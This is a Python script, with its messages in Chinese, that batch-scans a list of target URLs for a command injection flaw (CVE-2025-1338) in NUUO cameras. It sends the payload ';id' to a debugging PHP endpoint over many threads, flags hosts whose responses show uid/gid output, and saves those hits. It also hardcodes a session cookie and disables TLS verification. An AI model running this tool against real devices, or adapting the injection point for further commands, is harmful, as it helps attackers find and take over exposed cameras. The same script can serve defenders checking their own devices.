import os
import sys
import time
import argparse
import requests
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VULN_INFO = {
    "vulID": "CVE-2025-1338",
    "name": "NUUO Camera 命令注入漏洞",
    "vulPath": "/__debugging_center_utils___.php",
    "payload": ";id",
    "verifyKey1": "uid=",
    "verifyKey2": "gid="
}

REQUEST_CONFIG = {
    "headers": {
        "Cookie": "PHPSESSID=6hjpl1c6pvu8i0uln8cr6niv77",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    },
    "timeout": 10,
    "verify": False
}

def load_targets(target_file):
    if not os.path.exists(target_file):
        print(f"[!] 目标文件 {target_file} 不存在，请检查路径！")
        sys.exit(1)
    
    targets = set()
    with open(target_file, "r", encoding="utf-8") as f:
        for line in f:
            url = line.strip().strip("/")
            if url and (url.startswith("http://") or url.startswith("https://")):
                targets.add(url)
            elif url:
                targets.add(f"http://{url}")
    
    if not targets:
        print(f"[!] 从 {target_file} 中未加载到有效目标URL！")
        sys.exit(1)
    
    print(f"[+] 成功加载 {len(targets)} 个有效目标")
    return list(targets)

def verify_vuln(target):
    result = {
        "target": target,
        "status": "unknown",
        "message": "",
        "payload": VULN_INFO["payload"],
        "response_snippet": ""
    }
    
    try:
        vuln_url = urljoin(target, VULN_INFO["vulPath"])
        resp = requests.get(
            vuln_url,
            params={"log": VULN_INFO["payload"]},
            headers=REQUEST_CONFIG["headers"],
            timeout=REQUEST_CONFIG["timeout"],
            verify=REQUEST_CONFIG["verify"]
        )
        
        if resp.status_code == 200:
            if VULN_INFO["verifyKey1"] in resp.text and VULN_INFO["verifyKey2"] in resp.text:
                result["status"] = "vulnerable"
                result["message"] = "存在漏洞"
                result["response_snippet"] = resp.text[:200].replace("\n", " ")
            else:
                result["status"] = "safe"
                result["message"] = "响应不包含漏洞特征"
        else:
            result["status"] = "safe"
            result["message"] = f"响应状态码非200（实际：{resp.status_code}）"
    
    except requests.exceptions.Timeout:
        result["status"] = "timeout"
        result["message"] = "请求超时"
    except requests.exceptions.ConnectionError:
        result["status"] = "timeout"
        result["message"] = "连接失败（目标不可达）"
    except Exception as e:
        result["status"] = "unknown"
        result["message"] = f"未知错误：{str(e)[:50]}"
    
    return result

def print_result(result):
    COLOR = {
        "vulnerable": "\033[91m[高危]\033[0m",
        "safe": "\033[92m[安全]\033[0m",
        "timeout": "\033[93m[警告]\033[0m",
        "unknown": "\033[94m[未知]\033[0m"
    }
    
    status_color = COLOR.get(result["status"], "\033[94m[未知]\033[0m")
    print(f"{status_color} {result['target']} | {result['message']}")
    if result["status"] == "vulnerable":
        print(f"    ├─ Payload: {result['payload']}")
        print(f"    └─ 响应片段: {result['response_snippet']}\n")

def save_results(results, output_file):
    success_results = [res for res in results if res["status"] == "vulnerable"]
    
    with open(output_file, "w", encoding="utf-8") as f:
        for res in success_results:
            f.write(f"[+] 目标: {res['target']}\n")
            f.write(f"    状态: {res['status']}\n")
            f.write(f"    描述: {res['message']}\n")
            f.write(f"    Payload: {res['payload']}\n")
            f.write(f"    响应片段: {res['response_snippet']}\n\n")
    
    print(f"\n[+] 已将 {len(success_results)} 条成功结果保存到 {output_file}")

def main():
    parser = argparse.ArgumentParser(
        description=f"NUUO Camera {VULN_INFO['vulID']} 批量漏洞检测脚本",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-f", "--file", required=True, help="目标URL列表文件（每行一个URL，支持http/https）")
    parser.add_argument("-t", "--threads", type=int, default=10, help="并发线程数（默认10，建议不超过50）")
    parser.add_argument("-o", "--output", default="nuao_rce_results.txt", help="结果输出文件（默认nuao_rce_results.txt）")
    parser.add_argument("-v", "--version", action="help", help="显示帮助信息（同--help）")

    args = parser.parse_args()

    targets = load_targets(args.file)
    
    print(f"\n[*] 漏洞信息: {VULN_INFO['name']} ({VULN_INFO['vulID']})")
    print(f"[*] 并发线程: {args.threads}")
    print(f"[*] 超时时间: {REQUEST_CONFIG['timeout']}秒")
    print(f"[*] 结果输出: {args.output}")
    print(f"[*] 开始检测（{time.strftime('%Y-%m-%d %H:%M:%S')}）\n")

    all_results = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_tasks = {executor.submit(verify_vuln, target): target for target in targets}
        for future in as_completed(future_tasks):
            result = future.result()
            all_results.append(result)
            print_result(result)

    total = len(all_results)
    vuln_count = sum(1 for res in all_results if res["status"] == "vulnerable")
    safe_count = sum(1 for res in all_results if res["status"] == "safe")
    timeout_count = sum(1 for res in all_results if res["status"] == "timeout")
    unknown_count = sum(1 for res in all_results if res["status"] == "unknown")

    print("\n" + "="*60)
    print(f"检测完成（{time.strftime('%Y-%m-%d %H:%M:%S')}）")
    print(f"总计检测: {total} 个目标")
    print(f"存在漏洞: \033[91m{vuln_count}\033[0m 个")
    print(f"安全目标: \033[92m{safe_count}\033[0m 个")
    print(f"超时目标: \033[93m{timeout_count}\033[0m 个")
    print(f"未知状态: \033[94m{unknown_count}\033[0m 个")
    print("="*60)

    save_results(all_results, args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 用户中断检测，程序退出")
        sys.exit(0)
